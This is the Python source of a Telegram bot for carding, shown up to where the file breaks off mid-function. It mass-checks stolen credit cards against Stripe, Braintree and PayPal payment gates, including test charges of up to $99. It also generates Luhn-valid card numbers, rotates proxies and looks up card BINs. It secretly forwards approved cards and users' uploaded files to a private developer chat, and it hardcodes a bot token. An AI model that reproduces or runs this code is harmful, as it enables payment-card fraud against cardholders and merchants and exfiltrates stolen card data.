import telebot,os
import re,json
import requests
from reg import reg
import telebot, time, random
import random
import string
import user_agent
from telebot import types
from gatet import gatet
from stpauth import stripe_auth
from stcharge import check_card as stripe_charge, get_fresh_session_data as stcharge_get_session
from stc1 import check_card as stc1_check, get_fresh_session_data as stc1_get_session
from stc2 import check_card as stc2_check
from autostripe import check_card as autostripe_check, save_site_config, load_site_config, delete_site_config, list_sites, verify_stripe_login
from autobraintree import check_card as autobt_check, save_bt_site_config, load_bt_site_config, delete_bt_site_config, list_bt_sites, verify_bt_login
from ppcharge import pp_check, get_pp_session
from lions import check_card as lions_check
from proxy_manager import add_proxy, remove_proxy, clear_proxies, get_all_proxies, proxy_count
#from file import *
#from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
stopuser = {}
token = '7931862204:AAGu-fE96KhrPB4WGc-vR3ocLFYyC_3hHwM'
bot=telebot.TeleBot(token,parse_mode="HTML")
admin=8116724251
DEV_NAME = "@KeshavVortex2"
command_usage = {}
ALLOWED_FILE = "allowed.json"
FORWARD_CHAT_ID = -1002643237733

def forward_approved_card(card, gate, response, user_info, extra_info=None):
    """Forward approved/charged cards to the forward chat"""
    try:
        user_id = user_info.get('id', 'Unknown')
        username = user_info.get('username', '')
        first_name = user_info.get('first_name', 'Unknown')
        
        if username:
            user_display = f"@{username}"
        else:
            user_display = first_name
        
        msg = f"""🔥 <b>APPROVED/CHARGED</b>

<code>{card}</code>

Gate: {gate}
Response: {response}

From: {user_display} (<code>{user_id}</code>)"""
        
        if extra_info:
            msg += f"\n{extra_info}"
        
        bot.send_message(FORWARD_CHAT_ID, msg)
    except Exception as e:
        print(f"Forward error: {e}")

def forward_file_upload(message, file_name):
    """Forward file upload notification to the forward chat"""
    try:
        user_id = message.from_user.id
        username = message.from_user.username
        first_name = message.from_user.first_name
        
        if username:
            user_display = f"@{username}"
        else:
            user_display = first_name
        
        msg = f"""📁 <b>FILE UPLOADED</b>

File: {file_name}
From: {user_display} (<code>{user_id}</code>)
Chat: {message.chat.id}"""
        
        bot.send_message(FORWARD_CHAT_ID, msg)
        bot.forward_message(FORWARD_CHAT_ID, message.chat.id, message.message_id)
    except Exception as e:
        print(f"Forward file error: {e}")

def load_allowed_users():
    try:
        if os.path.exists(ALLOWED_FILE):
            with open(ALLOWED_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {"users": [admin]}

def save_allowed_users(data):
    with open(ALLOWED_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_user_allowed(user_id):
    if user_id == admin:
        return True
    data = load_allowed_users()
    return user_id in data.get("users", [])

def add_allowed_user(user_id):
    data = load_allowed_users()
    if user_id not in data["users"]:
        data["users"].append(user_id)
        save_allowed_users(data)
        return True
    return False

def remove_allowed_user(user_id):
    data = load_allowed_users()
    if user_id in data["users"] and user_id != admin:
        data["users"].remove(user_id)
        save_allowed_users(data)
        return True
    return False

def get_allowed_users():
    data = load_allowed_users()
    return data.get("users", [])

def luhn_checksum(card_number):
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10

def generate_luhn_card(bin_prefix, length=16):
    bin_prefix = str(bin_prefix)
    remaining = length - len(bin_prefix) - 1
    partial = bin_prefix + ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
    for check_digit in range(10):
        candidate = partial + str(check_digit)
        if luhn_checksum(candidate) == 0:
            return candidate
    return partial + '0'

def get_card_info(bin_prefix):
    bin_str = str(bin_prefix)
    first_digit = bin_str[0] if bin_str else '0'
    first_two = bin_str[:2] if len(bin_str) >= 2 else bin_str
    
    if first_digit == '3':
        if first_two in ['34', '37']:
            return {'length': 15, 'cvv_length': 4, 'brand': 'AMEX'}
        elif first_two == '35':
            return {'length': 16, 'cvv_length': 3, 'brand': 'JCB'}
        else:
            return {'length': 14, 'cvv_length': 3, 'brand': 'Diners'}
    elif first_digit == '4':
        return {'length': 16, 'cvv_length': 3, 'brand': 'VISA'}
    elif first_digit == '5':
        return {'length': 16, 'cvv_length': 3, 'brand': 'MasterCard'}
    elif first_digit == '6':
        return {'length': 16, 'cvv_length': 3, 'brand': 'Discover'}
    else:
        return {'length': 16, 'cvv_length': 3, 'brand': 'Unknown'}

def extract_cards(text):
    pattern = r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'
    matches = re.findall(pattern, text)
    cards = ['|'.join(m) for m in matches]
    return cards

def clean_card_format(text):
    cleaned_cards = []
    patterns = [
        r'(\d{13,19})[|\s/,;:\-]+(\d{1,2})[|\s/,;:\-]+(\d{2,4})[|\s/,;:\-]+(\d{3,4})',
        r'(\d{13,19})\s*[|\s/,;:\-]\s*(\d{2})\s*[|\s/,;:\-]\s*(\d{2,4})\s*[|\s/,;:\-]\s*(\d{3,4})',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for m in matches:
            card_num = m[0]
            month = m[1].zfill(2)
            year = m[2]
            cvv = m[3]
            
            if len(year) == 4:
                year = year[-2:]
            
            is_amex = card_num.startswith('34') or card_num.startswith('37')
            if is_amex:
                if len(cvv) == 3:
                    continue
            else:
                if len(cvv) == 4:
                    continue
            
            clean_cc = f"{card_num}|{month}|{year}|{cvv}"
            if clean_cc not in cleaned_cards:
                cleaned_cards.append(clean_cc)
    
    if not cleaned_cards:
        lines = text.replace(',', '\n').replace(';', '\n').split('\n')
        for line in lines:
            numbers = re.findall(r'\d+', line)
            if len(numbers) >= 4:
                card_num = numbers[0]
                if 13 <= len(card_num) <= 19:
                    month = numbers[1].zfill(2) if len(numbers[1]) <= 2 else numbers[1][:2]
                    year = numbers[2][-2:] if len(numbers[2]) >= 2 else numbers[2]
                    cvv = numbers[3]
                    
                    is_amex = card_num.startswith('34') or card_num.startswith('37')
                    if is_amex and len(cvv) == 4:
                        clean_cc = f"{card_num}|{month}|{year}|{cvv}"
                    elif not is_amex and len(cvv) == 3:
                        clean_cc = f"{card_num}|{month}|{year}|{cvv}"
                    else:
                        continue
                    
                    if clean_cc not in cleaned_cards:
                        cleaned_cards.append(clean_cc)
    
    return cleaned_cards

def get_cards_from_reply(message):
    try:
        reply = message.reply_to_message
        if reply and reply.document:
            file_info = bot.get_file(reply.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = downloaded.decode('utf-8', errors='ignore')
            cards = extract_cards(text)
            return cards if cards else None
        elif reply and reply.text:
            cards = extract_cards(reply.text)
            return cards if len(cards) > 1 else None
    except:
        pass
    return None

def mass_check_cards(message, cards, gate_type, gate_name):
    user_id = message.from_user.id
    total = len(cards)
    
    gate_cmd_map = {
        'braintree': '/chk', 'stripe': '/st', 'stcharge': '/stc',
        'stc1': '/stc1', 'stc2': '/stc2', 'pp': '/pp', 'lc': '/lc'
    }
    if gate_type.startswith('ast'):
        slot = re.sub(r'^ast', '', gate_type) or '1'
        gate_cmd = f'/ast{slot}'
    elif gate_type.startswith('abt'):
        slot = re.sub(r'^abt', '', gate_type) or '1'
        gate_cmd = f'/abt{slot}'
    else:
        gate_cmd = gate_cmd_map.get(gate_type, '/chk')
    
    batch_session = None
    if gate_type == 'stcharge':
        batch_session = stcharge_get_session()
    elif gate_type == 'stc1':
        batch_session = stc1_get_session()
    elif gate_type == 'pp':
        batch_session = get_pp_session()
    
    num_workers = 1 if gate_type == 'braintree' else 6
    status_msg = bot.reply_to(message, f"𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {total} 𝘾𝙖𝙧𝙙𝙨...⌛\n{num_workers} Workers Active 🔥")
    
    def check_single(cc, account_index=0):
        cc = cc.strip()
        if not cc or '|' not in cc:
            return None
        
        bin_code = cc[:6]
        bin_data = {}
        try:
            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)
            if r.status_code == 200:
                bin_data = r.json()
        except:
            pass
        
        bank = bin_data.get('bank', 'unknown')
        brand = bin_data.get('brand', 'unknown')
        card_type = bin_data.get('type', 'unknown')
        country = bin_data.get('country_name', 'unknown')
        country_flag = bin_data.get('country_flag', '')
        
        start_time = time.time()
        is_charged = False
        try:
            if gate_type == 'braintree':
                result = gatet(cc, account_index)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'stripe':
                last = str(stripe_auth(cc))
                is_approved = any(x in last.lower() for x in ['success', 'succeeded', 'avs', 'added', 'duplicate', 'approved'])
            elif gate_type == 'stcharge':
                result = stripe_charge(cc, batch_session)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'stc1':
                result = stc1_check(cc, batch_session)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'stc2':
                result = stc2_check(cc)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type.startswith('ast'):
                slot = re.sub(r'^ast', '', gate_type) or '1'
                result = autostripe_check(cc, str(user_id), slot)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type.startswith('abt'):
                slot = re.sub(r'^abt', '', gate_type) or '1'
                result = autobt_check(cc, str(user_id), slot)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'pp':
                result = pp_check(cc, batch_session)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'lc':
                result = lions_check(cc)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            else:
                result = gatet(cc)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
        except Exception as e:
            last = "ERROR"
            is_approved = False
        
        end_time = time.time()
        return {
            'cc': cc, 'last': last, 'is_approved': is_approved, 'is_charged': is_charged,
            'bank': bank, 'brand': brand, 'card_type': card_type,
            'country': country, 'country_flag': country_flag,
            'time': end_time - start_time
        }
    
    def run_mass():
        live = 0
        charged = 0
        dd = 0
        checked = 0
        is_charge_gate = gate_type in ['stcharge', 'stc1', 'stc2', 'pp']
        is_braintree_gate = gate_type == 'braintree' or gate_type.startswith('abt')
        stopuser[f'{user_id}'] = {'status': 'start'}
        
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            if gate_type == 'braintree':
                futures = {executor.submit(check_single, cc, i % 3): cc for i, cc in enumerate(cards)}
            else:
                futures = {executor.submit(check_single, cc): cc for cc in cards}
            
            for future in as_completed(futures):
                if stopuser[f'{user_id}']['status'] == 'stop':
                    executor.shutdown(wait=False, cancel_futures=True)
                    if is_charge_gate:
                        stop_text = f'𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n🔥 {charged} | ✅ {live} | ❌ {dd}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
                    else:
                        stop_text = f'𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n✅ {live} | ❌ {dd}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        text=stop_text
                    )
                    return
                
                try:
                    result = future.result()
                    if result is None:
                        continue
                    
                    checked += 1
                    cc = result['cc']
                    last = result['last']
                    
                    if result['is_approved']:
                        if result.get('is_charged'):
                            charged += 1
                            status_text = f"Charged 🔥 ({gate_cmd})"
                        elif '3d' in last.lower() or '3D' in last or 'secure' in last.lower():
                            live += 1
                            status_text = f"✅ 3D Secure Required ({gate_cmd})"
                        elif 'cvc' in last.lower() or 'cvv' in last.lower() or 'security code' in last.lower() or 'incorrect_cvc' in last.lower() or 'ccn' in last.lower():
                            live += 1
                            status_text = f"✅ CCN - CVV Not Match ({gate_cmd})"
                        else:
                            live += 1
                            status_text = f"✅ Approved ({gate_cmd})"
                        user_info = {
                            'id': message.from_user.id,
                            'username': message.from_user.username,
                            'first_name': message.from_user.first_name
                        }
                        forward_approved_card(cc, gate_name, last, user_info)
                        
                        if is_braintree_gate:
                            try:
                                bot.send_message(user_id, f"⏸️ Card approved! Pausing 20 seconds before next check...")
                            except:
                                pass
                            time.sleep(20)
                    else:
                        dd += 1
                        status_text = f"❌ Declined ({gate_cmd})"
                    
                    msg = f"""
<b>{status_text}</b>

<code>CC → {cc}</code>
Gate → {gate_name}
Response → {last}

BIN → <code>{cc[:6]} - {result['card_type']} - {result['brand']}</code>
Bank → {result['bank']}
Country → <code>{result['country']} {result['country_flag']}</code>
Time → {"{:.1f}".format(result['time'])} sec
Progress → {checked}/{total}
Bot By → {DEV_NAME}
"""
                    try:
                        bot.send_message(user_id, msg)
                    except Exception as send_err:
                        print(f"Send error: {send_err}")
                    
                    try:
                        mes = types.InlineKeyboardMarkup(row_width=1)
                        if is_charge_gate:
                            cm3 = types.InlineKeyboardButton(f"🔥 {charged} | ✅ {live} | ❌ {dd} | 📊 {checked}/{total}", callback_data='x')
                        else:
                            cm3 = types.InlineKeyboardButton(f"✅ {live} | ❌ {dd} | 📊 {checked}/{total}", callback_data='x')
                        stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
                        mes.add(cm3, stop)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f'𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 ({gate_name})...\n𝘽𝙤𝙩 𝘽𝙮 {DEV_NAME}',
                            reply_markup=mes
                        )
                    except:
                        pass
                except:
                    continue
        
        stopuser[f'{user_id}']['status'] = 'start'
        if is_charge_gate:
            final_text = f'𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n🔥 Charged: {charged}\n✅ Approved: {live}\n❌ Declined: {dd}\n📊 Total: {total}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
        else:
            final_text = f'𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n✅ Approved: {live}\n❌ Declined: {dd}\n📊 Total: {total}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=final_text
        )
    
    threading.Thread(target=run_mass).start()

def reset_command_usage():
        for user_id in command_usage:
                command_usage[user_id] = {'count': 0, 'last_time': None}        


@bot.message_handler(commands=['start'])
def send_image(message):
 
    username = message.from_user.username
    first_name = message.from_user.first_name

    if username:
        name = f"@{username}"
    else:
        name = first_name

    
    user_id = message.from_user.id
    is_admin = user_id == admin
    
    admin_section = ""
    if is_admin:
        admin_section = """
━━━━ 𝗔𝗗𝗠𝗜𝗡 ━━━━
/allow ➜ 𝗔𝗹𝗹𝗼𝘄 𝗨𝘀𝗲𝗿
/disallow ➜ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿
/users ➜ 𝗩𝗶𝗲𝘄 𝗨𝘀𝗲𝗿𝘀
"""

    caption = f"""
𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name} 👋

━━━━ 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 ━━━━

/st ➜ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
/stc ➜ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $1
/stc1 ➜ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $5
/stc2 ➜ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $99
/b3 ➜ 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
/chk ➜ 𝗖𝗵𝗲𝗰𝗸 𝗖𝗮𝗿𝗱
/pp ➜ 𝗣𝗮𝘆𝗣𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲 $1
/gen ➜ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗖𝗮𝗿𝗱𝘀
/fake ➜ 𝗙𝗮𝗸𝗲 𝗔𝗱𝗱𝗿𝗲𝘀𝘀

━━━━ 𝗔𝗨𝗧𝗢 𝗚𝗔𝗧𝗘𝗦 ━━━━
/ast1 ➜ 𝗔𝘂𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗶𝘁𝗲 #1
/ast2 ➜ 𝗔𝘂𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗶𝘁𝗲 #2
/abt1 ➜ 𝗔𝘂𝘁𝗼 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 #1
/abt2 ➜ 𝗔𝘂𝘁𝗼 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 #2

━━━━ 𝗧𝗢𝗢𝗟𝗦 ━━━━
/clean ➜ 𝗖𝗹𝗲𝗮𝗻 𝗖𝗮𝗿𝗱𝘀 𝗙𝗿𝗼𝗺 𝗧𝘅𝘁
/filter ➜ 𝗙𝗶𝗹𝘁𝗲𝗿 𝗕𝘆 𝗕𝗜𝗡

━━━━ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗦𝗜𝗧𝗘 ━━━━
/addsite ➜ 𝗔𝗱𝗱 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗶𝘁𝗲
/mysite ➜ 𝗩𝗶𝗲𝘄 𝗠𝘆 𝗦𝗶𝘁𝗲𝘀
/delsite ➜ 𝗗𝗲𝗹𝗲𝘁𝗲 𝗦𝗶𝘁𝗲

━━━━ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗦𝗜𝗧𝗘 ━━━━
/addbtsite ➜ 𝗔𝗱𝗱 𝗕𝗧 𝗦𝗶𝘁𝗲
/mybtsite ➜ 𝗩𝗶𝗲𝘄 𝗠𝘆 𝗦𝗶𝘁𝗲𝘀
/delbtsite ➜ 𝗗𝗲𝗹𝗲𝘁𝗲 𝗦𝗶𝘁𝗲

━━━━ 𝗣𝗥𝗢𝗫𝗬 𝗦𝗘𝗧𝗨𝗣 ━━━━
/addproxy ➜ 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝘆
/delproxy ➜ 𝗗𝗲𝗹𝗲𝘁𝗲 𝗣𝗿𝗼𝘅𝘆
/proxies ➜ 𝗩𝗶𝗲𝘄 𝗣𝗿𝗼𝘅𝗶𝗲𝘀
/clearproxy ➜ 𝗖𝗹𝗲𝗮𝗿 𝗔𝗹𝗹
{admin_section}
━━━━ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ━━━━
📄 Upload .txt file for mass check

𝗕𝗼𝘁 𝗕𝘆 ➜ {DEV_NAME}
"""

    bot.send_message(message.chat.id, caption)

#
#



CHANNEL_ID = "@KEVINCODERMAFIA"


def check_sub(user_id):
    try:
        status = bot. get_chat_member(CHANNEL_ID, user_id). status
        return status in ["member", "administrator", "creator"]
    except:
        return False



@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id

    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return

    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    forward_file_upload(message, message.document.file_name)
    
    file_path = f"combo.txt"
    with open(file_path, "wb") as f:
        f.write(downloaded_file)

   
    markup = types.InlineKeyboardMarkup(row_width=2)
    button1 = types.InlineKeyboardButton("𝐵𝑟𝑎𝑖𝑛𝑡𝑟𝑒𝑒 𝐴𝑢𝑡ℎ", callback_data="file_braintree")
    button2 = types.InlineKeyboardButton("𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡", callback_data="file_stripe")
    button3 = types.InlineKeyboardButton("𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 $1", callback_data="file_stcharge")
    button4 = types.InlineKeyboardButton("𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 $5", callback_data="file_stc1")
    button5 = types.InlineKeyboardButton("𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 $99", callback_data="file_stc2")
    button6 = types.InlineKeyboardButton("𝐀𝐮𝐭𝐨 𝐒𝐭𝐫𝐢𝐩𝐞", callback_data=f"file_ast_{message.from_user.id}")
    button7 = types.InlineKeyboardButton("𝐏𝐚𝐲𝐏𝐚𝐥 $1", callback_data="file_pp")
    markup.add(button1, button2, button3, button4, button5, button6, button7)
    bot.reply_to(message, "✅ ​​(VIP Member)\nSelect Gate:", reply_markup=markup)



@bot.callback_query_handler(func=lambda call: call.data.startswith("file_"))
def file_callback(call):
    if not is_user_allowed(call.from_user.id):
        bot.answer_callback_query(call.id, "⚠️ Access Denied")
        return
    
    bot.answer_callback_query(call.id, " 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁")
    
    gate_type = call.data.split("_")[1]
    
    batch_session = None
    if gate_type == 'stcharge':
        batch_session = stcharge_get_session()
    elif gate_type == 'stc1':
        batch_session = stc1_get_session()
    elif gate_type == 'pp':
        batch_session = get_pp_session()
    
    def check_single_card(cc, gate_type, ast_user_id=None):
        cc = cc.strip()
        if not cc or '|' not in cc:
            return None
            
        bin_code = cc[:6]
        bin_data = {}
        
        try:
            headers = {"Accept-Version": "3", "User-Agent": "Mozilla/5.0"}
            r = requests.get(f"https://lookup.binlist.net/{bin_code}", headers=headers, timeout=5)
            if r.status_code == 200:
                bin_data = r.json()
        except:
            pass
        
        if not bin_data:
            try:
                r = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)
                if r.status_code == 200:
                    bin_data = r.json()
            except:
                pass
        
        bank = bin_data.get('bank', {}).get('name') or bin_data.get('bank') or 'unknown'
        brand = bin_data.get('scheme') or bin_data.get('brand') or 'unknown'
        card_type = bin_data.get('type') or 'unknown'
        country = bin_data.get('country', {}).get('name') or bin_data.get('country_name') or 'unknown'
        country_flag = bin_data.get('country', {}).get('emoji') or bin_data.get('country_flag') or ''
        
        start_time = time.time()
        is_charged = False
        is_approved = False
        try:
            if gate_type == 'stripe':
                last = str(stripe_auth(cc))
                is_approved = any(x in last.lower() for x in ['success', 'succeeded', 'avs', 'added', 'duplicate', 'approved'])
            elif gate_type == 'stcharge':
                result = stripe_charge(cc, batch_session)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'stc1':
                result = stc1_check(cc, batch_session)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'stc2':
                result = stc2_check(cc)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type.startswith('ast'):
                slot = re.sub(r'^ast', '', gate_type) or '1'
                result = autostripe_check(cc, ast_user_id, slot)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type.startswith('abt'):
                slot = re.sub(r'^abt', '', gate_type) or '1'
                result = autobt_check(cc, ast_user_id, slot)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            elif gate_type == 'pp':
                result = pp_check(cc, batch_session)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                    is_charged = 'charged' in last.lower()
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
            else:
                result = gatet(cc)
                if isinstance(result, dict):
                    last = result.get('message', 'Unknown')
                    is_approved = result.get('approved', False)
                else:
                    last = str(result) if result else 'ERROR'
                    is_approved = False
        except Exception as e:
            last = "ERROR"
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        if 'risk' in last.lower():
            last = 'declined'
            is_approved = False
        
        return {
            'cc': cc,
            'last': last,
            'is_approved': is_approved,
            'is_charged': is_charged,
            'bank': bank,
            'brand': brand,
            'card_type': card_type,
            'country': country,
            'country_flag': country_flag,
            'execution_time': execution_time
        }
    
    def my_function():
        id = call.from_user.id
        gate_info = {
            'stripe': ('Stripe Auth', '/st'),
            'stcharge': ('Stripe Charge $1', '/stc'),
            'stc1': ('Stripe Charge $5', '/stc1'),
            'stc2': ('Stripe Charge $99', '/stc2'),
            'pp': ('PayPal $1', '/pp'),
        }
        if gate_type.startswith('ast'):
            slot = re.sub(r'^ast', '', gate_type) or '1'
            gate = f'Auto Stripe #{slot}'
            gate_cmd = f'/ast{slot}'
        elif gate_type.startswith('abt'):
            slot = re.sub(r'^abt', '', gate_type) or '1'
            gate = f'Auto Braintree #{slot}'
            gate_cmd = f'/abt{slot}'
        elif gate_type in gate_info:
            gate, gate_cmd = gate_info[gate_type]
        else:
            gate = 'Braintree Auth'
            gate_cmd = '/chk'
        
        ast_user_id = None
        if gate_type.startswith('ast_'):
            ast_user_id = gate_type.split('_')[1]
        
        dd = 0
        live = 0
        charged = 0
        checked = 0
        is_charge_gate = gate_type in ['stcharge', 'stc1', 'stc2', 'pp']
        file_path = f"combo.txt"

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛\n6 Workers Active 🔥"
        )

        try:
            with open(file_path, 'r') as file:
                cards = [line.strip() for line in file.readlines() if line.strip() and '|' in line.strip()]
                total = len(cards)
                stopuser[f'{id}'] = {'status': 'start'}

            with ThreadPoolExecutor(max_workers=6) as executor:
                futures = {executor.submit(check_single_card, cc, gate_type, ast_user_id): cc for cc in cards}
                
                for future in as_completed(futures):
                    if stopuser[f'{id}']['status'] == 'stop':
                        executor.shutdown(wait=False, cancel_futures=True)
                        if is_charge_gate:
                            stop_text = f'𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n🔥 {charged} | ✅ {live} | ❌ {dd}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
                        else:
                            stop_text = f'𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n✅ {live} | ❌ {dd}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=stop_text
                        )
                        return
                    
                    try:
                        result = future.result()
                        if result is None:
                            continue
                        
                        checked += 1
                        cc = result['cc']
                        last = result['last']
                        
                        if result['is_approved']:
                            if result.get('is_charged'):
                                charged += 1
                                status_text = f"Charged 🔥 ({gate_cmd})"
                            elif '3d' in last.lower() or '3D' in last or 'secure' in last.lower():
                                live += 1
                                status_text = f"✅ 3D Secure Required ({gate_cmd})"
                            elif 'cvc' in last.lower() or 'cvv' in last.lower() or 'security code' in last.lower() or 'incorrect_cvc' in last.lower() or 'ccn' in last.lower():
                                live += 1
                                status_text = f"✅ CCN - CVV Not Match ({gate_cmd})"
                            else:
                                live += 1
                                status_text = f"✅ Approved ({gate_cmd})"
                            user_info = {
                                'id': call.from_user.id,
                                'username': call.from_user.username,
                                'first_name': call.from_user.first_name
                            }
                            forward_approved_card(cc, gate, last, user_info)
                        else:
                            dd += 1
                            status_text = f"❌ Declined ({gate_cmd})"
                        
                        msg = f"""
<b>{status_text}</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {result['card_type']} - {result['brand']}</code>
Bank → {result['bank']}
Country → <code>{result['country']} {result['country_flag']}</code>
Time → {"{:.1f}".format(result['execution_time'])} sec
Progress → {checked}/{total}
Bot By → {DEV_NAME}
"""
                        try:
                            bot.send_message(call.from_user.id, msg)
                        except Exception as send_err:
                            print(f"Send error: {send_err}")
                        
                        try:
                            mes = types.InlineKeyboardMarkup(row_width=1)
                            if is_charge_gate:
